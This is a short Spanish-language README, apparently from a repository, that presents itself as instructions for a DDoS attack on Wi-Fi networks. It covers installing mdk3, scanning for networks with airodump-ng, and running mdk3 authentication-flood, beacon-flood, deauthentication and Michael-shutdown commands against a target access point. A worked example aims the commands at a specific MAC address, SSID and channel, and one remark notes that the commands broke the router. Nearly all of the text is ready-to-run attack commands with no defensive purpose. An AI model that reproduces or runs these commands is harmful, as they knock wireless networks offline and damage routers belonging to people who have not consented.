# KaliLinux-MKD3-DDOS
Contiene las instrucciones necesarias para perpetrar un ataque DDOS


## Instalación de MDK3

```bash
git clone https://github.com/charlesxsh/mdk3-master.git
cd mdk3-master
make
make install
```

## Ataque de destruccion

Monitorear Redes:

```bash
airodump-ng wlan0
#ctrl + c
```

Ataque:

```bash
sudo mdk3 wlan0 a -a MAC -m 
sudo mdk3 wlan0 b -a MAC -n SSID -h -c CANAL 
sudo mdk3 wlan0 d -a MAC -c CANAL
sudo mdk3 wlan0 m -a MAC  
```
>NOTA: b, d, m; rompió el enrutador 





## Ejemplo de Ataque

Monitorear Redes:

```bash
airodump-ng wlan0
#ctrl + c
```

Ataque:

```bash
sudo mdk3 wlan0 a -a D8:32:14:D2:51:70 -m 
sudo mdk3 wlan0 b -a D8:32:14:D2:51:70 -n CARM -h -c 11
sudo mdk3 wlan0 d -a D8:32:14:D2:51:70 -c 11
sudo mdk3 wlan0 m -t D8:32:14:D2:51:70 
